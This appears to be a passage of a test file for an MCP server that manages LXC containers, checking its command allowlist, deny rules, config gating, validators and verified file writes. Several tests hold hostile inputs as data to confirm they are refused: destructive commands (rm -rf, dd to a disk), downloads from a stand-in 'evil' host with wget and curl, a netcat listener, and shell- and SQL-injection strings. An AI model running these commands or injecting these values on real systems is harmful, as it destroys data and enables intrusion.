test('parseLxcCommand: deny_always wins, including reordered curl output flags', () => {
  for (const cmd of [
    'rm -rf /opt/app', 'mv /a /b', 'dd if=/dev/zero of=/dev/sda',
    'shutdown now', 'reboot',
    'docker compose down', 'docker rm web', 'docker system prune -f', 'docker volume rm data',
    'apt install nmap', 'apt-get update', 'dpkg -i pkg.deb',
    'iptables -F', 'nft flush ruleset',
    'sh -c ls', 'bash script.sh', 'python3 x.py', 'node evil.js',
    'chmod 777 /etc/shadow', 'chown root /tmp/x',
    'ssh host', 'nc -l 4444', 'wget http://evil/payload',
    'curl -o /tmp/x http://evil/', 'curl --output /tmp/x http://evil/',
    // The reordering hole: -o buried behind other flags must still be denied.
    'curl -sS -o /tmp/x http://evil/', 'curl -fsSL http://evil/ -o /opt/app/x',
    // The respelling holes: the same flag clustered (-sSo), attached
    // (-o/tmp/x), joined (--output=/tmp/x), or capital -O in a cluster.
    'curl -sSo /tmp/x http://evil/', 'curl -o/tmp/x http://evil/',
    'curl --output=/tmp/x http://evil/', 'curl -sSO http://evil/x',
    'curl -fsSLo/opt/app/x http://evil/',
  ]) {
    const r = parseLxcCommand(cmd, LXC_POLICY, WD);
    assert.ok(r.error, `should deny: ${cmd}`);
  }
});

test('parseLxcCommand: shell syntax and non-plain args are rejected with guidance', () => {
  for (const cmd of ['ls | grep x', 'ls > /tmp/out', 'ls; rm -rf /', 'ls && reboot', 'echo $(id)', 'ls `id`', 'ls &']) {
    const r = parseLxcCommand(cmd, LXC_POLICY, WD);
    assert.ok(r.error, cmd);
    assert.match(r.error, /shell|plain argument/i, cmd);
  }
  assert.match(parseLxcCommand('', LXC_POLICY, WD).error, /required/);
  assert.match(parseLxcCommand('ls "a b"', LXC_POLICY, WD).error, /plain argument/);
});

test('parseLxcCommand: mutating commands are scoped to the registered working dir', () => {
  const ok = parseLxcCommand('docker compose up -d', LXC_POLICY, WD);
  assert.equal(ok.error, undefined);
  assert.equal(ok.scope, 'mutating_scoped');
  // Wrong dir → refused, naming the registered dir.
  const wrong = parseLxcCommand('docker compose restart', LXC_POLICY, { workingDir: '/etc', registeredWorkingDir: '/opt/app' });
  assert.match(wrong.error, /\/opt\/app/);
  // No registered startup at all → refused too.
  const none = parseLxcCommand('docker compose pull', LXC_POLICY, { workingDir: '/opt/app', registeredWorkingDir: null });
  assert.match(none.error, /no registered startup/);
  // docker compose up needs the FULL prefix: bare "docker compose upgrade" is
  // not a prefix match of ["docker","compose","up","-d"].
  assert.ok(parseLxcCommand('docker compose up', LXC_POLICY, WD).error);
});

test('parseLxcCommand: unknown commands get the what-IS-allowed answer', () => {
  const r = parseLxcCommand('vmstat 1 5', LXC_POLICY, WD);
  assert.match(r.error, /not in the allowlist/);
  assert.match(r.error, /docker/);
});

test('lxcCommandTimeoutMs follows the policy window', () => {
  assert.equal(lxcCommandTimeoutMs(undefined, LXC_POLICY), 120000);
  assert.equal(lxcCommandTimeoutMs(300, LXC_POLICY), 300000);
  assert.equal(lxcCommandTimeoutMs(99999, LXC_POLICY), 1800000);
  assert.equal(lxcCommandTimeoutMs(0, {}), 120000);
});

test('policy file shape: read_only, scoped, deny lists all present and argv-shaped', () => {
  for (const entry of LXC_POLICY.read_only) assert.ok(Array.isArray(entry) && entry.length >= 1);
  for (const entry of LXC_POLICY.mutating_scoped.commands) assert.ok(Array.isArray(entry));
  for (const entry of LXC_POLICY.deny_always.commands) assert.ok(Array.isArray(entry));
  assert.ok(LXC_POLICY.shell_syntax_rejected.includes('|'));
  assert.ok(LXC_POLICY.output_cap_bytes >= 64 * 1024);
});

test('lxcContainerDetail maps addresses, config subset, and snapshots', () => {
  const d = lxcContainerDetail({
    status: 'Running',
    created_at: '2026-08-01T00:00:00Z',
    profiles: ['default'],
    config: {
      'security.nesting': 'true', 'security.privileged': 'false',
      'limits.memory': '4GB', 'boot.autostart': 'true',
      'image.os': 'Debian', 'volatile.eth0.hwaddr': '00:16:3e:aa:bb:cc',
    },
    state: {
      network: {
        lo: { addresses: [{ address: '127.0.0.1', family: 'inet', scope: 'local' }] },
        eth0: {
          addresses: [
            { address: '10.167.1.20', family: 'inet', scope: 'global', netmask: '24' },
            { address: 'fe80::1', family: 'inet6', scope: 'link' },
          ],
        },
      },
    },
    snapshots: [{ name: 'pre-privilege-flip', created_at: '2026-08-10T00:00:00Z' }],
  });
  assert.equal(d.status, 'Running');
  assert.deepEqual(d.addresses, [{ interface: 'eth0', address: '10.167.1.20', family: 'inet', netmask: '24' }]);
  // Only security./limits./boot. keys — image and volatile noise excluded.
  assert.deepEqual(Object.keys(d.config).sort(),
    ['boot.autostart', 'limits.memory', 'security.nesting', 'security.privileged']);
  assert.equal(d.snapshots[0].name, 'pre-privilege-flip');
  // Nothing blows up on a minimal instance.
  assert.deepEqual(lxcContainerDetail({}).addresses, []);
});

// ---- cycle 4: lifecycle/config gating ----

import {
  validSnapshotName, defaultSnapshotName, validateLxcConfigChange,
  validIpv4, validImageAlias,
} from '../lib/mcp-logic.js';

const CFG_POLICY = JSON.parse(
  readFileSync(new URL('../lib/mcp-policy/lxc-config-allowlist.json', import.meta.url), 'utf8'),
);

test('validateLxcConfigChange: allowlisted keys pass with their gates', () => {
  const nest = validateLxcConfigChange('security.nesting', 'true', {}, CFG_POLICY);
  assert.equal(nest.error, undefined);
  assert.equal(nest.restartRequired, true);
  assert.equal(nest.warning, null);

  const cpu = validateLxcConfigChange('limits.cpu', '4', {}, CFG_POLICY);
  assert.equal(cpu.restartRequired, false);
  assert.ok(validateLxcConfigChange('limits.cpu', 'four', {}, CFG_POLICY).error);

  assert.equal(validateLxcConfigChange('limits.memory', '8GB', {}, CFG_POLICY).error, undefined);
  assert.equal(validateLxcConfigChange('limits.memory', '512MiB', {}, CFG_POLICY).error, undefined);
  assert.ok(validateLxcConfigChange('limits.memory', 'lots', {}, CFG_POLICY).error);
  assert.ok(validateLxcConfigChange('security.nesting', 'yes', {}, CFG_POLICY).error);
});

test('validateLxcConfigChange: privileged=true needs acknowledge_risk and carries the warning', () => {
  const refused = validateLxcConfigChange('security.privileged', 'true', {}, CFG_POLICY);
  assert.match(refused.error, /acknowledge_risk/);
  assert.match(refused.error, /host root/);

  const ok = validateLxcConfigChange('security.privileged', 'true', { acknowledgeRisk: true }, CFG_POLICY);
  assert.equal(ok.error, undefined);
  // The warning rides on SUCCESS too — the tool presents the trade-off, it
  // does not just apply the flip.
  assert.match(ok.warning, /host root/);
  // Turning privileged OFF needs no acknowledgement.
  const off = validateLxcConfigChange('security.privileged', 'false', {}, CFG_POLICY);
  assert.equal(off.error, undefined);
  assert.equal(off.warning, null);
});

test('validateLxcConfigChange: non-allowlisted keys are rejected, dangerous ones with their rationale', () => {
  assert.match(validateLxcConfigChange('raw.lxc', 'x', {}, CFG_POLICY).error, /deliberately not writable.*host-level/i);
  assert.match(validateLxcConfigChange('raw.idmap', 'x', {}, CFG_POLICY).error, /orphan/i);
  const unknown = validateLxcConfigChange('user.foo', 'x', {}, CFG_POLICY);
  assert.match(unknown.error, /not a writable config key/);
  assert.match(unknown.error, /security\.nesting/);
});

test('snapshot names: custom validated, default sortable and deterministic', () => {
  assert.equal(validSnapshotName('pre-upgrade_2'), 'pre-upgrade_2');
  assert.equal(validSnapshotName('-bad'), null);
  assert.equal(validSnapshotName('has space'), null);
  assert.equal(validSnapshotName(''), null);
  assert.equal(defaultSnapshotName(new Date(Date.UTC(2026, 7, 12, 9, 5, 3))), 'pp-mcp-20260812-090503');
  assert.equal(defaultSnapshotName(new Date(Date.UTC(2026, 7, 12, 9, 5, 3)), 'pp-mcp-pre-security_privileged'),
    'pp-mcp-pre-security_privileged-20260812-090503');
});

test('validIpv4 and validImageAlias reject the confusing shapes', () => {
  assert.equal(validIpv4('10.167.1.20'), '10.167.1.20');
  assert.equal(validIpv4('256.1.1.1'), null);
  assert.equal(validIpv4('10.0.0.01'), null);
  assert.equal(validIpv4('10.0.0'), null);
  assert.equal(validIpv4('fe80::1'), null);
  assert.equal(validImageAlias('images:debian/12'), 'images:debian/12');
  assert.equal(validImageAlias('ubuntu:24.04'), 'ubuntu:24.04');
  assert.equal(validImageAlias('--vm'), null);
  assert.equal(validImageAlias('a b'), null);
  assert.equal(validImageAlias(''), null);
});

// ---- cycle 3: routing validation + probe parsing ----

import {
  validDomainName, normalizePort, parseCurlProbeOutput, classifyCurlExit,
} from '../lib/mcp-logic.js';

test('validDomainName: FQDNs (incl. wildcard) pass, everything confusing fails', () => {
  assert.equal(validDomainName('web.example.com'), 'web.example.com');
  assert.equal(validDomainName('Web.Example.COM'), 'web.example.com');
  assert.equal(validDomainName('*.example.com'), '*.example.com');
  assert.equal(validDomainName('a-b.example.co.uk'), 'a-b.example.co.uk');
  assert.equal(validDomainName('localhost'), null);          // needs a dot
  assert.equal(validDomainName('-bad.example.com'), null);
  assert.equal(validDomainName('exa mple.com'), null);
  assert.equal(validDomainName('example..com'), null);
  assert.equal(validDomainName('http://example.com'), null);
  assert.equal(validDomainName(''), null);
});

test('normalizePort clamps to real ports', () => {
  assert.equal(normalizePort(443), 443);
  assert.equal(normalizePort('3000'), 3000);
  assert.equal(normalizePort(0), null);
  assert.equal(normalizePort(65536), null);
  assert.equal(normalizePort(3.5), null);
  assert.equal(normalizePort('web'), null);
});

test('parseCurlProbeOutput: last response block wins, headers whitelisted, trailer parsed', () => {
  const dump = [
    'HTTP/1.1 301 Moved Permanently',
    'Location: https://web.example.com/',
    'Set-Cookie: session=SECRET; HttpOnly',
    '',
    'HTTP/2 200',
    'server: Caddy',
    'content-type: text/html; charset=utf-8',
    'set-cookie: sid=ALSO_SECRET',
    '',
    'PP_TIME:0.042',
    'PP_CODE:200',
  ].join('\r\n');
  const r = parseCurlProbeOutput(dump);
  assert.equal(r.status_code, 200);
  assert.deepEqual(r.status_chain, [301, 200]);
  assert.equal(r.server, 'Caddy');
  assert.equal(r.content_type, 'text/html; charset=utf-8');
  assert.equal(r.location, null);              // reset by the second block
  assert.equal(r.time_seconds, 0.042);
  // Cookies never surface anywhere in the parsed result.
  assert.ok(!JSON.stringify(r).includes('SECRET'));
});

test('parseCurlProbeOutput: a 101 upgrade block parses even with no trailer', () => {
  const r = parseCurlProbeOutput('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\n\r\n');
  assert.equal(r.status_code, 101);
  assert.equal(r.time_seconds, null);
  assert.deepEqual(parseCurlProbeOutput('').status_chain, []);
});

test('classifyCurlExit maps the failure classes a caller acts on', () => {
  assert.equal(classifyCurlExit(6).class, 'dns');
  assert.equal(classifyCurlExit(7).class, 'connect_refused');
  assert.equal(classifyCurlExit(28).class, 'timeout');
  assert.equal(classifyCurlExit(35).class, 'tls');
  assert.equal(classifyCurlExit(127).class, 'curl_missing');
  assert.match(classifyCurlExit(99).hint, /99/);
});

// ---- cycle 5: observe parsing + static-site id handling ----

import {
  parseStatFileList, parseSystemctlShow, validUnitName, validProbeHost,
  validFileGlob, normalizeServiceId,
} from '../lib/mcp-logic.js';

test('parseStatFileList: files, dirs, and symlinks with targets', () => {
  const out = [
    "-rw-r--r--|1024|1723400000|'/opt/app/config.json'",
    "drwxr-xr-x|4096|1723400001|'/opt/app/data'",
    "lrwxrwxrwx|11|1723400002|'/opt/app/current' -> '/opt/app/v2'",
    'garbage line',
  ].join('\n');
  const entries = parseStatFileList(out);
  assert.equal(entries.length, 3);
  assert.deepEqual(entries[0], {
    path: '/opt/app/config.json', type: 'file', size: 1024,
    mode: 'rw-r--r--', mtime: new Date(1723400000 * 1000).toISOString(),
  });
  assert.equal(entries[1].type, 'dir');
  assert.equal(entries[2].type, 'symlink');
  assert.equal(entries[2].target, '/opt/app/v2');
  assert.deepEqual(parseStatFileList(''), []);
});

test('parseSystemctlShow splits key=value, keeping = inside values', () => {
  const r = parseSystemctlShow('ActiveState=active\nExecMainStatus=0\nResult=success\nX=a=b\n');
  assert.equal(r.ActiveState, 'active');
  assert.equal(r.ExecMainStatus, '0');
  assert.equal(r.X, 'a=b');
});

test('validUnitName / validProbeHost / validFileGlob reject option-lookalikes and junk', () => {
  assert.equal(validUnitName('docker.service'), 'docker.service');
  assert.equal(validUnitName('proxypilot-startup.service'), 'proxypilot-startup.service');
  assert.equal(validUnitName('-u'), null);
  assert.equal(validUnitName('a b'), null);
  assert.equal(validProbeHost('127.0.0.1'), '127.0.0.1');
  assert.equal(validProbeHost('db.internal'), 'db.internal');
  assert.equal(validProbeHost('-flag'), null);
  assert.equal(validProbeHost('a b'), null);
  assert.equal(validFileGlob('*.yml'), '*.yml');
  assert.equal(validFileGlob('docker-compose.y?l'), 'docker-compose.y?l');
  assert.equal(validFileGlob('../x'), null);
  assert.equal(validFileGlob('a/b'), null);
});

test('normalizeServiceId keeps uuid AND legacy integer ids (the Number() NaN trap)', () => {
  assert.equal(normalizeServiceId('3'), '3');
  assert.equal(normalizeServiceId(3), '3');
  const uuid = '550e8400-e29b-41d4-a716-446655440000';
  assert.equal(normalizeServiceId(uuid), uuid);
  assert.equal(normalizeServiceId(''), null);
  assert.equal(normalizeServiceId("x'; DROP TABLE services;--"), null);
  assert.equal(normalizeServiceId(null), null);
});

test('tool catalog covers the full 25-tool upgrade surface', () => {
  const names = new Set(MCP_TOOLS.map((t) => t.name));
  for (const required of [
    // cycle 2
    'get_lxc_container', 'run_lxc_command',
    // cycle 3
    'list_routes', 'get_route', 'test_route', 'set_route',
    // cycle 4
    'create_lxc_container', 'control_lxc_container', 'set_lxc_config',
    'set_lxc_network', 'snapshot_lxc_container', 'lxc_file_diff', 'restore_lxc_file',
    // cycle 5
    'list_lxc_files', 'search_lxc_files', 'get_lxc_logs', 'probe_lxc_port', 'get_lxc_startup',
    'create_static_site', 'get_static_site', 'list_static_site_files',
    'read_static_site_file', 'write_static_site_file', 'get_static_site_cert',
    // the 2026-08-25 field session
    'delete_route', 'get_host_diagnostics',
  ]) {
    assert.ok(names.has(required), `missing tool ${required}`);
  }
});

test('every declared tool is actually wired to a handler', () => {
  // A tool that exists in the catalog but not in the dispatch table advertises
  // a capability that answers "unknown tool" — the catalog is what a client
  // reads, so the two have to be checked against each other mechanically.
  const routeSrc = readFileSync(new URL('../routes/mcp.js', import.meta.url), 'utf8');
  const table = routeSrc.slice(routeSrc.indexOf('const TOOL_HANDLERS'));
  for (const t of MCP_TOOLS) {
    assert.ok(new RegExp(`\\n  ${t.name}: `).test(table), `tool ${t.name} is declared but not dispatched`);
  }
});

// ---- follow-ups: access-log error counts + policy drift guard ----

import { summarizeAccessLog, caddyAccessLogPath } from '../lib/mcp-logic.js';

test('summarizeAccessLog counts requests and 5xx inside the window, counts only', () => {
  const now = 1_755_000_000_000;                    // fixed clock, ms
  const at = (secAgo, status, extra = {}) =>
    JSON.stringify({ ts: (now - secAgo * 1000) / 1000, status, request: { uri: '/secret?token=abc' }, ...extra });
  const text = [
    at(60, 200), at(120, 200), at(300, 301),
    at(400, 502), at(500, 502), at(600, 504),
    at(4000, 502),                                   // outside the hour
    at(30, 200, { ts: undefined }),                  // no ts → skipped
    'not json at all',
    at(90, 404),
  ].join('\n');
  const r = summarizeAccessLog(text, now);
  assert.equal(r.window_seconds, 3600);
  assert.equal(r.requests, 7);                       // 4000s-ago and broken lines excluded
  assert.equal(r.errors_5xx, 3);
  assert.deepEqual(r.by_error_status, { 502: 2, 504: 1 });
  // The tail reached back past the window start (the 4000s entry), so the
  // window is fully covered.
  assert.equal(r.partial_window, false);
  // Nothing but counts leaves — no URI, no token, no headers.
  assert.ok(!JSON.stringify(r).includes('secret'));
  assert.ok(!JSON.stringify(r).includes('token'));
});

test('summarizeAccessLog flags a partial window when the tail starts inside it', () => {
  const now = 1_755_000_000_000;
  const text = JSON.stringify({ ts: (now - 600 * 1000) / 1000, status: 502 });
  const r = summarizeAccessLog(text, now);
  assert.equal(r.errors_5xx, 1);
  assert.equal(r.partial_window, true);              // oldest entry is only 10 min back
  assert.deepEqual(summarizeAccessLog('', now), {
    window_seconds: 3600, requests: 0, errors_5xx: 0, by_error_status: {}, partial_window: false,
  });
});

test('caddyAccessLogPath matches the merged config builder, wildcards sanitized', () => {
  assert.equal(caddyAccessLogPath('web.example.com'), '/var/log/caddy/web.example.com.log');
  assert.equal(caddyAccessLogPath('*.example.com'), '/var/log/caddy/_wildcard_.example.com.log');
});

// The two policy JSONs are vendored from the component spec, and the spec's
// usage notes call them the enforcement source of truth. This guard makes the
// keep-in-sync comments mechanical: edit one copy without the other and the
// suite says so.
test('drift guard: lib/mcp-policy matches the mcp-lxc-sites-upgrades component spec', () => {
  const componentDoc = JSON.parse(readFileSync(
    new URL('../../../../docs/features/examples/mcp-lxc-sites-upgrades.component.json', import.meta.url), 'utf8',
  ));
  for (const name of ['lxc-command-allowlist.json', 'lxc-config-allowlist.json']) {
    const vendored = JSON.parse(readFileSync(new URL(`../lib/mcp-policy/${name}`, import.meta.url), 'utf8'));
    const specFile = componentDoc.files.find((f) => f.path === `spec/mcp-upgrades/policy/${name}`);
    assert.ok(specFile, `component spec no longer carries policy/${name}`);
    assert.deepEqual(vendored, JSON.parse(specFile.content),
      `${name} drifted between lib/mcp-policy/ and the component spec — update BOTH (the spec is the design record, lib/mcp-policy is what the server enforces)`);
  }
});

// ---- write integrity: the guard that turns a short read into an error ----
//
// The bug these exist for: edit_project_file read a file, replaced a string in
// memory, and wrote the whole thing back — but the read came back short (the
// host capture wrapper stopped at 256 KB while the tool advertised 512 KB), so
// what got written was a stump. It happened five times, cutting at ~267 KB,
// ~299 KB and ~327 KB. Nothing errored, because nothing checked.

import {
  expectedEditBytes, editByteInvariantError, expectedSha256Error, readIntegrityError,
  normalizeInsertLine, parseWriteOk, verifiedWriteScript, appendScript, insertAtLineScript,
  NO_SHA,
} from '../lib/mcp-logic.js';
import { spawn } from 'node:child_process';
import { mkdtempSync, writeFileSync, readdirSync, existsSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

test('expectedEditBytes is arithmetic, not an estimate — including multi-byte text', () => {
  // 100 bytes, two 2-byte matches replaced by 4-byte text → 100 - 4 + 8.
  assert.equal(expectedEditBytes(100, 'ab', 'cdef', 2), 104);
  // "é" is two BYTES and one character; the invariant counts bytes.
  assert.equal(expectedEditBytes(50, 'e', 'é', 1), 51);
  assert.equal(expectedEditBytes(50, 'x', '', 3), 47);
});

test('editByteInvariantError passes a correct edit and names the shortfall on a truncated one', () => {
  const original = 'aaa\nHELLO\nbbb\n';
  const edited = original.replace('HELLO', 'WORLD!');
  assert.equal(editByteInvariantError({
    path: 'src/a.ts', originalBytes: Buffer.byteLength(original),
    oldString: 'HELLO', newString: 'WORLD!', replaced: 1, content: edited,
  }), null);

  // The real failure, scaled down: a 300 KB file read back at 267 KB, edited,
  // and about to be written over the original.
  const whole = 'x'.repeat(300_000) + 'HELLO' + 'y'.repeat(1000);
  const shortRead = whole.slice(0, 267_000).replace('HELLO', 'WORLD');
  const err = editByteInvariantError({
    path: 'src/big.ts', originalBytes: Buffer.byteLength(whole),
    oldString: 'HELLO', newString: 'WORLD', replaced: 1, content: shortRead,
  });
  assert.ok(err, 'a 34 KB shortfall must not pass');
  assert.match(err, /267000 bytes/);
  assert.match(err, /bytes short/);
  assert.match(err, /untouched/);
});

test('editByteInvariantError also catches an edit that is too LONG', () => {
  const err = editByteInvariantError({
    path: 'a.ts', originalBytes: 10, oldString: 'a', newString: 'b', replaced: 1, content: 'x'.repeat(40),
  });
  assert.match(err, /30 bytes over/);
});

test('expectedSha256Error: absent is fine, malformed is not, mismatch names both hashes', () => {
  const mine = 'a'.repeat(64);
  assert.equal(expectedSha256Error('a.ts', undefined, mine), null);
  assert.equal(expectedSha256Error('a.ts', '', mine), null);
  assert.equal(expectedSha256Error('a.ts', mine, mine), null);
  assert.match(expectedSha256Error('a.ts', 'nope', mine), /64-character hex/);
  const drift = expectedSha256Error('a.ts', mine, 'b'.repeat(64));
  assert.match(drift, /has changed since you read it/);
  assert.match(drift, /another agent/);
  // A container that cannot hash must not silently "pass" the precondition.
  assert.match(expectedSha256Error('a.ts', mine, NO_SHA), /cannot be verified/);
});

test('readIntegrityError catches a short transfer and a corrupted one', () => {
  const body = Buffer.from('hello world\n');
  const sha = createHash('sha256').update(body).digest('hex');
  assert.equal(readIntegrityError('a.ts', body.length, sha, body), null);
  assert.match(readIntegrityError('a.ts', 999, sha, body), /came back short/);
  assert.match(readIntegrityError('a.ts', body.length, 'c'.repeat(64), body), /does not match the file's own SHA-256/);
  // No hasher on the far side still leaves the byte count doing its job.
  assert.equal(readIntegrityError('a.ts', body.length, NO_SHA, body), null);
});

test('normalizeInsertLine takes 1-based whole numbers only', () => {
  assert.equal(normalizeInsertLine(1), 1);
  assert.equal(normalizeInsertLine('12'), 12);
  assert.equal(normalizeInsertLine(0), null);
  assert.equal(normalizeInsertLine(-3), null);
  assert.equal(normalizeInsertLine(2.5), null);
  assert.equal(normalizeInsertLine(undefined), null);
});

test('parseWriteOk reads the verified trailer, and refuses anything else', () => {
  assert.deepEqual(parseWriteOk('PP_OK 120 abc 4\n'), { bytes: 120, sha256: 'abc', total_lines: 4 });
  // An unterminated single line is one line, not zero.
  assert.equal(parseWriteOk(`PP_OK 5 ${NO_SHA} 0\n`).total_lines, 1);
  assert.equal(parseWriteOk(`PP_OK 5 ${NO_SHA} 0\n`).sha256, null);
  assert.equal(parseWriteOk(''), null);
  assert.equal(parseWriteOk('something else\n'), null);
});

// ---- the in-container scripts, run for real against a temp directory ----
//
// These are POSIX sh and the whole point of them is what they do on a
// filesystem, so they are executed rather than string-matched.

function runScript(script, argv, input) {
  return new Promise((resolve) => {
    const child = spawn('sh', ['-c', script, 'sh', ...argv], { stdio: ['pipe', 'pipe', 'pipe'] });
    let out = ''; let err = '';
    child.stdout.on('data', (d) => { out += d; });
    child.stderr.on('data', (d) => { err += d; });
    child.on('exit', (status) => resolve({ status, out, err }));
    // A script that refuses BEFORE it reads stdin (a precondition failure, a
    // missing file) closes the pipe under us; that is the behaviour under
    // test, not an error, so the EPIPE it races into must not fail the run.
    child.stdin.on('error', () => {});
    child.stdin.end(input ?? '');
  });
}

const shaOf = (s) => createHash('sha256').update(Buffer.from(s, 'utf8')).digest('hex');
const scratch = () => mkdtempSync(join(tmpdir(), 'pp-write-'));

test('verifiedWriteScript writes, verifies, and reports what landed', async () => {
  const dir = scratch();
  const f = join(dir, 'a.txt');
  writeFileSync(f, 'old\n');
  const next = 'one\ntwo\n';
  const r = await runScript(verifiedWriteScript(), [f, String(Buffer.byteLength(next)), shaOf(next), '', '1', ''], next);
  assert.equal(r.status, 0, r.err);
  assert.deepEqual(parseWriteOk(r.out), { bytes: 8, sha256: shaOf(next), total_lines: 2 });
  assert.equal(readFileSync(f, 'utf8'), next);
  assert.equal(readFileSync(`${f}.old`, 'utf8'), 'old\n', 'the replaced file is kept');
});

test('verifiedWriteScript refuses a short transfer and leaves the original alone', async () => {
  const dir = scratch();
  const f = join(dir, 'a.txt');
  writeFileSync(f, 'ORIGINAL\n');
  // Declare 500 bytes, send 8: exactly what a truncated stream looks like.
  const r = await runScript(verifiedWriteScript(), [f, '500', shaOf('x'.repeat(500)), '', '0', ''], 'partial\n');
  assert.equal(r.status, 65);
  assert.match(r.err, /PP_STAGE_BYTES 8/);
  assert.equal(readFileSync(f, 'utf8'), 'ORIGINAL\n', 'a failed write must not touch the target');
  assert.deepEqual(
    readdirSync(dir).sort(), ['a.txt'],
    'the staging file is cleaned up, not left behind in the checkout',
  );
});

test('verifiedWriteScript refuses content whose hash does not match the declared one', async () => {
  const dir = scratch();
  const f = join(dir, 'a.txt');
  writeFileSync(f, 'ORIGINAL\n');
  const body = 'hello\n';
  const r = await runScript(verifiedWriteScript(), [f, String(body.length), shaOf('something else'), '', '0', ''], body);
  assert.equal(r.status, 65);
  assert.match(r.err, /PP_STAGE_SHA/);
  assert.equal(readFileSync(f, 'utf8'), 'ORIGINAL\n');
});

test('verifiedWriteScript honours the expected_sha256 precondition', async () => {
  const dir = scratch();
  const f = join(dir, 'a.txt');
  writeFileSync(f, 'v1\n');
  const body = 'v2\n';
  const args = [f, String(body.length), shaOf(body), '', '0'];
  // Somebody else's hash → refused, file untouched.
  let r = await runScript(verifiedWriteScript(), [...args, shaOf('other\n')], body);
  assert.equal(r.status, 64);
  assert.match(r.err, /PP_PRECONDITION/);
  assert.equal(readFileSync(f, 'utf8'), 'v1\n');
  // The real hash → allowed.
  r = await runScript(verifiedWriteScript(), [...args, shaOf('v1\n')], body);
  assert.equal(r.status, 0, r.err);
  assert.equal(readFileSync(f, 'utf8'), 'v2\n');
});

test('verifiedWriteScript keeps the target mode across an edit, and applies an explicit one', async () => {
  const dir = scratch();
  const f = join(dir, 'run.sh');
  writeFileSync(f, '#!/bin/sh\n', { mode: 0o755 });
  const body = '#!/bin/sh\necho hi\n';
  let r = await runScript(verifiedWriteScript(), [f, String(body.length), shaOf(body), '', '0', ''], body);
  assert.equal(r.status, 0, r.err);
  assert.equal(statSync(f).mode & 0o777, 0o755, 'an executable script stays executable');
  const body2 = 'plain\n';
  r = await runScript(verifiedWriteScript(), [f, String(body2.length), shaOf(body2), '0600', '0', ''], body2);
  assert.equal(r.status, 0, r.err);
  assert.equal(statSync(f).mode & 0o777, 0o600);
});

test('appendScript adds bytes without moving the file, and rolls back a short append', async () => {
  const dir = scratch();
  const f = join(dir, 'log.txt');
  writeFileSync(f, 'a\nb\n');
  const add = 'c\n';
  let r = await runScript(appendScript(), [f, String(add.length), '1', ''], add);
  assert.equal(r.status, 0, r.err);
  assert.equal(readFileSync(f, 'utf8'), 'a\nb\nc\n');
  assert.equal(parseWriteOk(r.out).bytes, 6);
  assert.equal(parseWriteOk(r.out).total_lines, 3);

  // Claim more bytes than arrive: the file must come back to its old length.
  r = await runScript(appendScript(), [f, '900', '1', ''], 'd\n');
  assert.equal(r.status, 66);
  assert.equal(readFileSync(f, 'utf8'), 'a\nb\nc\n', 'a bad append is rolled back');
});

test('appendScript refuses a missing file unless asked to create it', async () => {
  const dir = scratch();
  const f = join(dir, 'nested/new.txt');
  let r = await runScript(appendScript(), [f, '2', '1', ''], 'x\n');
  assert.equal(r.status, 67);
  assert.equal(existsSync(f), false);
  r = await runScript(appendScript(), [f, '2', '0', ''], 'x\n');
  assert.equal(r.status, 0, r.err);
  assert.equal(readFileSync(f, 'utf8'), 'x\n');
});

test('insertAtLineScript inserts before the given line and keeps the rest intact', async () => {
  const dir = scratch();
  const f = join(dir, 'a.txt');
  writeFileSync(f, 'a\nb\nc\n');
  const add = 'X\n';
  const r = await runScript(insertAtLineScript(), [f, '2', String(add.length), ''], add);
  assert.equal(r.status, 0, r.err);
  assert.equal(readFileSync(f, 'utf8'), 'a\nX\nb\nc\n');
  assert.equal(parseWriteOk(r.out).total_lines, 4);
});

test('insertAtLineScript allows total_lines + 1 (the end) and refuses past it', async () => {
  const dir = scratch();
  const f = join(dir, 'a.txt');
  writeFileSync(f, 'a\nb\n');
  let r = await runScript(insertAtLineScript(), [f, '3', '2', ''], 'Z\n');
  assert.equal(r.status, 0, r.err);
  assert.equal(readFileSync(f, 'utf8'), 'a\nb\nZ\n');
  r = await runScript(insertAtLineScript(), [f, '99', '2', ''], 'Z\n');
  assert.equal(r.status, 68);
  assert.match(r.err, /PP_PAST_END 3/);
  assert.equal(readFileSync(f, 'utf8'), 'a\nb\nZ\n', 'a refused insert changes nothing');
});

test('insertAtLineScript refuses a short transfer and honours the precondition', async () => {
  const dir = scratch();
  const f = join(dir, 'a.txt');
  writeFileSync(f, 'a\nb\n');
  let r = await runScript(insertAtLineScript(), [f, '1', '900', ''], 'Z\n');
  assert.equal(r.status, 65);
  assert.match(r.err, /PP_INSERT_BYTES/);
  assert.equal(readFileSync(f, 'utf8'), 'a\nb\n');
  r = await runScript(insertAtLineScript(), [f, '1', '2', shaOf('different\n')], 'Z\n');
  assert.equal(r.status, 64);
  assert.equal(readFileSync(f, 'utf8'), 'a\nb\n');
});

test('the additive tools and the sha precondition are in the catalog', () => {
  const byName = new Map(MCP_TOOLS.map((t) => [t.name, t]));
  for (const n of ['append_project_file', 'insert_project_file_at_line']) {
    assert.ok(byName.has(n), `missing tool ${n}`);
  }
  // Every tool that overwrites or extends a file offers the precondition.
  for (const n of ['edit_project_file', 'write_project_file', 'write_lxc_file',
    'append_project_file', 'insert_project_file_at_line']) {
    assert.ok(byName.get(n).inputSchema.properties.expected_sha256, `${n} needs expected_sha256`);
    // ...and never demands it: existing callers keep working.
    assert.ok(!byName.get(n).inputSchema.required.includes('expected_sha256'));
  }
  assert.deepEqual(byName.get('insert_project_file_at_line').inputSchema.required,
    ['project_id', 'path', 'line', 'content']);
});

// ---- catalog ⇄ dispatch parity (source-level: routes/mcp.js pulls in the
//      native DB, so it cannot be imported here) ----

test('every advertised tool has a handler, and every file write goes through the verified path', () => {
  const routeSrc = readFileSync(new URL('../routes/mcp.js', import.meta.url), 'utf8');
  const table = routeSrc.slice(routeSrc.indexOf('const TOOL_HANDLERS = {'));
  const body = table.slice(0, table.indexOf('\n};'));
  for (const t of MCP_TOOLS) {
    assert.ok(new RegExp(`\\n  ${t.name}:`).test(body), `${t.name} is advertised but not dispatched`);
  }
  // The ratchet: a raw `cat > "$p"` in a file tool is how the truncation bug
  // shipped. New writes go through verifiedContainerWrite / the script
  // builders, which check bytes and hash before anything replaces a file.
  const rawWrites = routeSrc.match(/cat > "\$p"/g) || [];
  assert.equal(rawWrites.length, 0,
    'file writes must go through verifiedContainerWrite (staged, hashed, read back), not a bare cat >');
});

test('a staged write keeps the target mode AND owner (the inode is replaced)', async () => {
  const dir = scratch();
  const f = join(dir, 'startup.sh');
  writeFileSync(f, '#!/bin/sh\n', { mode: 0o750 });
